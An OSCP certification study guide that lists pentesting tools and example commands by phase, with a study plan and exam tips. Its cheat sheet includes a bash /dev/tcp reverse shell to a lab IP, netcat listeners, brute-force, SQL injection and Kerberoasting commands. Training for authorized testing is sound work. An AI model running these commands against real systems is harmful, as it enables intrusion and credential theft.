# Red Team Certifications — OSCP Essentials

Focused guide for OSCP and beyond.

**Target:** Offensive Security Certified Professional (OSCP)
**Prerequisites:** Linux fundamentals (RHCSA-level), networking basics

---

## Learning Philosophy

Master **~50 essential tools and commands**.

OSCP is hands-on. You learn by doing, not memorizing. This guide shows the minimum toolkit.

---

## Certification Path

| Cert | Focus | Difficulty | When |
|------|-------|-----------|------|
| PNPT | Practical pentesting | Medium | Before OSCP |
| OSCP | Offensive security | Hard | Main goal |
| CRTO | Red team ops | Hard | After OSCP |
| OSEP | Advanced evasion | Very Hard | Later |

**Recommended:** RHCSA → PNPT → OSCP → CRTO → OSEP

---

## Phase 1 — Reconnaissance

**Essential tools: 4**

| Tool | Purpose | Example |
|------|---------|---------|
| nmap | Port scanning | nmap -sV -sC -p- 10.10.10.5 |
| masscan | Fast scanning | masscan -p1-65535 10.0.0.0/24 |
| gobuster | Dir brute force | gobuster dir -u http://target -w wordlist |
| ffuf | Web fuzzing | ffuf -u http://target/FUZZ -w wordlist |

**Practice:** Scan 5 HTB boxes, identify all services.

---

## Phase 2 — Enumeration

**Essential tools: 5**

| Tool | Purpose | Example |
|------|---------|---------|
| enum4linux | SMB enumeration | enum4linux -a 10.10.10.5 |
| smbclient | SMB access | smbclient -L //10.10.10.5 |
| nikto | Web server scan | nikto -h http://target |
| whatweb | Web fingerprint | whatweb http://target |
| wpscan | WordPress scan | wpscan --url http://target |

**Practice:** Enumerate all services on 5 boxes.

---

## Phase 3 — Exploitation

**Essential tools: 5**

| Tool | Purpose | Example |
|------|---------|---------|
| searchsploit | Find exploits | searchsploit apache 2.4.49 |
| msfconsole | Metasploit | msfconsole -q |
| sqlmap | SQL injection | sqlmap -u "http://target?id=1" |
| hydra | Brute force | hydra -l admin -P pass.txt ssh://target |
| nc | Reverse shells | nc -lvnp 4444 |

**Practice:** Exploit 3 easy HTB boxes with manual and Metasploit.

---

## Phase 4 — Post-Exploitation

**Essential tools: 5**

| Tool | Purpose | Example |
|------|---------|---------|
| linpeas | Linux privesc enum | ./linpeas.sh |
| winpeas | Windows privesc enum | winpeas.exe |
| pspy | Process monitor | ./pspy64 |
| sudo -l | Check sudo rights | sudo -l |
| find | Find SUID files | find / -perm -4000 2>/dev/null |

**Practice:** PrivEsc on 5 HTB boxes (3 Linux, 2 Windows).

---

## Phase 5 — Web Application Attacks

**Essential tools: 5**

| Tool | Purpose | Example |
|------|---------|---------|
| burpsuite | Web proxy | Launch GUI |
| ffuf | Parameter fuzzing | ffuf -u http://target?FUZZ=test -w params |
| nuclei | Vuln scanning | nuclei -u http://target |
| curl | Manual HTTP | curl -X POST http://target -d "user=admin" |
| wfuzz | Web fuzzing | wfuzz -u http://target/FUZZ -w list |

**Practice:** Complete 10 HTB web challenges.

---

## Phase 6 — Privilege Escalation

**Linux essentials: 5**

| Command | Purpose |
|---------|---------|
| sudo -l | Check sudo permissions |
| find / -perm -4000 | Find SUID binaries |
| cat /etc/crontab | Check cron jobs |
| ls -la /home/* | Check home dirs |
| cat /etc/passwd | Check users |

**Windows essentials: 5**

| Command | Purpose |
|---------|---------|
| whoami /priv | Check privileges |
| net user | List users |
| systeminfo | System info |
| schtasks | Scheduled tasks |
| tasklist | Running processes |

---

## Phase 7 — Active Directory

**Essential tools: 4**

| Tool | Purpose | Example |
|------|---------|---------|
| impacket | AD attack suite | impacket-psexec |
| bloodhound | AD visualization | Launch GUI |
| crackmapexec | AD recon | crackmapexec smb 10.10.10.0/24 |
| rubeus | Kerberos attacks | rubeus.exe kerberoast |

**Practice:** Complete 5 AD boxes on HTB.

---

## Essential Commands (Cheat Sheet)

**File transfer:**
- wget URL — Download
- curl -O URL — Download
- scp file user@host:/path — Copy over SSH
- python3 -m http.server — Serve files

**Reverse shells:**
- nc -lvnp 4444 — Listener
- bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 — Bash shell
- python3 -c 'import socket,subprocess,os;...' — Python shell

**Tunneling:**
- ssh -D 1080 user@host — SOCKS proxy
- chisel — Tunneling tool
- sshuttle — VPN over SSH

---

## 6-Month Study Plan

| Month | Focus | Deliverable |
|-------|-------|-------------|
| 1 | RHCSA first | RHCSA cert |
| 2 | Linux privesc | 20 HTB easy boxes |
| 3 | Web attacks | 20 HTB medium boxes |
| 4 | Windows + AD | 20 HTB Windows boxes |
| 5 | Full OSCP labs | HTB Pro Labs |
| 6 | Mock exams | 3 full simulations |

---

## Practice Platforms

| Platform | Cost | Best For |
|----------|------|----------|
| HackTheBox | Free + Paid | General practice |
| TryHackMe | Free + Paid | Beginner-friendly |
| Proving Grounds | Paid | OSCP-like |
| VulnHub | Free | Offline VMs |
| OffSec Labs | Paid | Official OSCP prep |

**Recommendation:** Do 50 HTB boxes + 20 PG boxes before OSCP exam.

---

## Study Resources

| Resource | Cost | Notes |
|----------|------|-------|
| OffSec PEN-200 course | Paid | Official |
| TJ Null OSCP list | Free | HTB/PG box list |
| "Penetration Testing" (Georgia Weidman) | Paid | Foundational |
| IppSec YouTube | Free | Box walkthroughs |
| HackTricks | Free | Command reference |
| PayloadsAllTheThings | Free | Exploit cheatsheet |

---

## Exam Strategy

**Format:** 24 hours, 5 machines, 70 points to pass

**Time allocation:**
- 2 hours: Recon all 5 machines
- 10 hours: Exploit easiest 3
- 8 hours: Exploit remaining 2
- 4 hours: Report writing

**Rules:**
- No Metasploit on all machines
- Must provide screenshots
- Documentation is graded
- Buffer Overflow is a bonus

---

## Integration with Elite Platform

All OSCP practice happens in this lab:

- Store notes in /data/cybersecurity/red-team/
- Use /data/evidence/ for screenshots
- Use /data/vm-images/ for Kali/Windows VMs
- Commit writeups to elite-platform repo

---

## Progress Tracker

| Skill | Boxes Completed | Date |
|-------|----------------|------|
| Recon | [ ] 10 boxes | |
| Enumeration | [ ] 10 boxes | |
| Web attacks | [ ] 15 boxes | |
| Linux privesc | [ ] 15 boxes | |
| Windows privesc | [ ] 10 boxes | |
| Active Directory | [ ] 5 boxes | |
| Buffer Overflow | [ ] 5 challenges | |

---

## Beyond OSCP

Once OSCP is done:

| Cert | Focus | Timeline |
|------|-------|----------|
| CRTO | Red team operations | 3 months |
| OSEP | Advanced evasion | 6 months |
| OSWE | Web exploitation | 6 months |

---

**50 tools. 6 months. One cert. Start now.**
